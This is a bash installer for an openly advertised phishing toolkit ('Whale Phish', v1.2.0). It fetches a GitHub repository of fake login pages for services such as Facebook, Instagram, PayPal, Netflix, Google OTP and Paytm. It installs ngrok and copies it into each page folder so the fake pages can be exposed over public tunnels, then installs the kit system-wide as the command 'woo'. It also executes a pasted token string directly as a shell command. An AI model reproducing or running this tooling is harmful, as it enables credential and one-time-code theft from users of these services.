# Backmail

2#!/bin/bash

clear

sudo apt-get install lolcat -y

sudo apt install lolcat -y

echo "

 

 █     █░    ██░ ██     ▄▄▄          ██▓       ▓█████        ██▓███      ██░ ██     ██▓     ██████     ██░ ██ 

▓█░ █ ░█░   ▓██░ ██▒   ▒████▄       ▓██▒       ▓█   ▀       ▓██░  ██▒   ▓██░ ██▒   ▓██▒   ▒██    ▒    ▓██░ ██▒

▒█░ █ ░█    ▒██▀▀██░   ▒██  ▀█▄     ▒██░       ▒███         ▓██░ ██▓▒   ▒██▀▀██░   ▒██▒   ░ ▓██▄      ▒██▀▀██░

░█░ █ ░█    ░▓█ ░██    ░██▄▄▄▄██    ▒██░       ▒▓█  ▄       ▒██▄█▓▒ ▒   ░▓█ ░██    ░██░     ▒   ██▒   ░▓█ ░██ 

░░██▒██▓    ░▓█▒░██▓    ▓█   ▓██▒   ░██████▒   ░▒████▒      ▒██▒ ░  ░   ░▓█▒░██▓   ░██░   ▒██████▒▒   ░▓█▒░██▓

░ ▓░▒ ▒      ▒ ░░▒░▒    ▒▒   ▓▒█░   ░ ▒░▓  ░   ░░ ▒░ ░      ▒▓▒░ ░  ░    ▒ ░░▒░▒   ░▓     ▒ ▒▓▒ ▒ ░    ▒ ░░▒░▒

  ▒ ░ ░      ▒ ░▒░ ░     ▒   ▒▒ ░   ░ ░ ▒  ░    ░ ░  ░      ░▒ ░         ▒ ░▒░ ░    ▒ ░   ░ ░▒  ░ ░    ▒ ░▒░ ░

  ░   ░      ░  ░░ ░     ░   ▒        ░ ░         ░         ░░           ░  ░░ ░    ▒ ░   ░  ░  ░      ░  ░░ ░

    ░        ░  ░  ░         ░  ░       ░  ░      ░  ░                   ░  ░  ░    ░           ░      ░  ░  ░

                         

 ------------------------------------------------------------------------------------------------------------------

 ------------------------------------C R E A T E D  B Y------------------------------------------------------------

					     

 █████╗     ██████╗     ██╗         ██╗         █████╗     ██████╗     ███╗   ███╗     █████╗     ███╗   ██╗

██╔══██╗    ██╔══██╗    ██║         ██║        ██╔══██╗    ██╔══██╗    ████╗ ████║    ██╔══██╗    ████╗  ██║

███████║    ██████╔╝    ██║         ██║        ███████║    ██████╔╝    ██╔████╔██║    ███████║    ██╔██╗ ██║

██╔══██║    ██╔══██╗    ██║    ██   ██║        ██╔══██║    ██╔══██╗    ██║╚██╔╝██║    ██╔══██║    ██║╚██╗██║

██║  ██║    ██║  ██║    ██║    ╚█████╔╝        ██║  ██║    ██║  ██║    ██║ ╚═╝ ██║    ██║  ██║    ██║ ╚████║

╚═╝  ╚═╝    ╚═╝  ╚═╝    ╚═╝     ╚════╝         ╚═╝  ╚═╝    ╚═╝  ╚═╝    ╚═╝     ╚═╝    ╚═╝  ╚═╝    ╚═╝  ╚═══╝

                                                                                                version- 1.2.0        " |lolcat -a -d 7

echo 

echo 

echo -e "\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Best Phishing Tool Please Wait \e[0m"

echo

sleep 2

echo -e "\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Checking Required Dependencies \e[0m"

sleep 1

sudo apt-get install xterm > /dev/null 2>&1

cyan='\033[0;36m'

green='\033[0;32m'

lightgreen='\e[0;32m'

white='\e[0;37m'

red='\e[0;31m'

yellow='\033[0;33m'

blue='\033[0;34m'

orange='\e[38;5;166m'

dependencies() {

which apache2 > /dev/null 2>&1

if [ "$?" -eq "0" ]; then

  echo

  sleep 2

  echo -e "$green" "[ ✔ ] apache2......................[ found ]"

else

  echo

  sleep 2

  echo -e "$red" "[ X ] apache2......................[ not found ]"

fi

which php > /dev/null 2>&1

if [ "$?" -eq "0" ]; then

  echo

  sleep 2

  echo -e "$green" "[ ✔ ] php......................[ found ]"

else

  echo

  sleep 2

  echo -e "$red" "[ X ] php......................[ not found ]"

fi

which tail > /dev/null 2>&1

if [ "$?" -eq "0" ]; then

  echo

  sleep 2

  echo -e "$green" "[ ✔ ] tail......................[ found ]"

else

  echo

  sleep 2

  echo -e "$red" "[ X ] tail......................[ not found ]"

fi

which jq > /dev/null 2>&1

if [ "$?" -eq "0" ]; then

  echo

  sleep 2

  echo -e "$green" "[ ✔ ] jq......................[ found ]"

else

  echo

  sleep 2

  echo -e "$red" "[ X ] jq......................[ not found ]"

fi

which curl > /dev/null 2>&1

if [ "$?" -eq "0" ]; then

  echo

  sleep 2

  echo -e "$green" "[ ✔ ] curl......................[ found ]"

else

  echo

  sleep 2

  echo -e "$red" "[ X ] curl......................[ not found ]"

fi

which xterm > /dev/null 2>&1

if [ "$?" -eq "0" ]; then

  echo

  sleep 2

  echo -e "$green" "[ ✔ ] xterm......................[ found ]"

else

  echo

  sleep 2

  echo -e "$red" "[ X ] xterm......................[ not found ]"

fi

which wget > /dev/null 2>&1

if [ "$?" -eq "0" ]; then

  echo

  sleep 2

  echo -e "$green" "[ ✔ ] wget......................[ found ]\e[m"

else

  echo

  sleep 2

  echo -e "$red" "[ X ] wget......................[ not found ]\e[m"

fi

echo

}

#dependencies

dependencies

sleep 4

xterm -T "whale © 2020" -geometry 115x35 -e "sudo apt-get update"

xterm -T "whale © 2020" -geometry 115x35 -e "sudo apt-get install apache2 -y"

xterm -T "whale © 2020" -geometry 115x35 -e "sudo apt-get install php -y"

xterm -T "whale © 2020" -geometry 115x35 -e "sudo apt-get install jq -y"

xterm -T "whale © 2020" -geometry 115x35 -e "sudo apt-get install tail -y"

xterm -T "whale © 2020" -geometry 115x35 -e "sudo apt-get install curl -y"

xterm -T "whale © 2020" -geometry 115x35 -e "sudo apt-get install xterm -y"

xterm -T "whale © 2020" -geometry 115x35 -e "sudo apt-get install wget -y"

clear

echo

dependencies

sleep 4

sudo apt-get install figlet -y && apt-get install toilet -y

git clone https://github.com/Bhaviktutorials/shark

cd shark

mv phs ..

cd ..

rm -rf shark

clear

echo

echo

echo -e "\e[31m[\e[32m~\e[31m]\e[33m Instaling ngrok .. \e[m "

echo

wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip

echo -e "\e[31m[\e[32m~\e[31m]\e[33m Successfuly installed \e[m "

sleep 3

echo

echo -e "\e[31m[\e[32m~\e[31m]\e[33m Inflating ngrok \e[m "

sleep 4

unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1

echo

echo -e "\e[31m[\e[32m~\e[31m]\e[33m Done \e[m "

sleep 2

chmod +x ngrok

chmod +x whale_logo

cp -R ngrok phs/github/

cp -R whale_logo phs/github

cp -R ngrok phs/Hotstar-otp-bypass/

cp -R whale_logo phs/Hotstar-otp-bypass

cp -R ngrok phs/instagram/

cp -R whale_logo phs/instagram

cp -R ngrok phs/Linkedin/

cp -R whale_logo phs/Linkedin

cp -R ngrok phs/Netflix/

cp -R whale_logo phs/Netflix

cp -R ngrok phs/Paytm-Phishing/paytm/

cp -R whale_logo phs/Paytm-Phishing/paytm

cp -R ngrok phs/Paytm-Phishing/signup/

cp -R whale_logo phs/Paytm-Phishing/signup

cp -R ngrok phs/spotify/

cp -R whale_logo phs/spotify

cp -R ngrok phs/whatsapp-phishing/

cp -R whale_logo phs/whatsapp-phishing

cp -R ngrok phs/facebook/

cp -R whale_logo phs/facebook

cp -R ngrok phs/google-otp/

cp -R whale_logo phs/google-otp

cp -R ngrok phs/instafollow/

cp -R whale_logo phs/instafollow

cp -R ngrok phs/ipfinder/

cp -R whale_logo phs/ipfinder

cp -R ngrok phs/ola-otpbypass/

cp -R whale_logo phs/ola-otpbypass

cp -R ngrok phs/UberEats-Phishing/

cp -R whale_logo phs/UberEats-Phishing

cp -R ngrok phs/Zomato-Phishing/

cp -R whale_logo phs/Zomato-Phishing

cp -R ngrok phs/amazonsign/

cp -R whale_logo phs/amazonsign

cp -R ngrok phs/phonepay/

cp -R whale_logo phs/phonepay

cp -R ngrok phs/paypal/

cp -R whale_logo phs/paypal

cp -R ngrok phs/telegram/

cp -R whale_logo phs/telegram

cp -R ngrok phs/twitter/

cp -R whale_logo phs/twitter

cp -R ngrok phs/flipcart/

cp -R whale_logo phs/flipcart

cp -R ngrok phs/wordpress/

cp -R whale_logo phs/wordpress

cp -R ngrok phs/snapchat/

cp -R whale_logo phs/snapchat

cp -R ngrok phs/protonmail/

cp -R whale_logo phs/protonmail

cp -R ngrok phs/stackoverflow/

cp -R whale_logo phs/stackoverflow

cp -R ngrok phs/ebay/

cp -R whale_logo phs/ebay

cp -R ngrok phs/twitch/

cp -R whale_logo phs/twitch

cp -R ngrok phs/ajio/

cp -R whale_logo phs/ajio

cp -R ngrok phs/cryptocurrency/

cp -R whale_logo phs/cryptocurrency

cp -R ngrok phs/mobikwik/

cp -R whale_logo phs/mobikwik

cp -R ngrok phs/pinterest/

cp -R whale_logo phs/pinterest

clear

echo 

echo 

echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit ngrok.com \e[m "

sleep 2

echo " "

echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "

sleep 1

echo " "

read -p $'\e[31m[\e[32m*\e[31m]\e[33m Paste Your Ngrok Token [Ex. ./ngrok authtoken ] : \e[0m' token

$token >> /dev/null 2>&1

sleep 1

clear

echo

echo

echo -e "\e[92m[+] Setting up woo \e[m "

echo 

rm setup

rm woo

mv kali-setup setup 

mv kali-woo woo

cp -R phs /usr/bin

cp -R woo /usr/bin

###########XXXXXXXXXXXXX####################

#     JUST LEARNING KEEP SUPPORTING        #

############XXXXXXXXXXXX####################

echo -e "\e[92m[+] To run the tool from anywhere simply type : woo \e[m "

echo -e "\e[92m[+] To run the tool from anywhere simply type : woo \e[m "

echo 

exit

#####################################

#           THANKYOU                #

#####################################
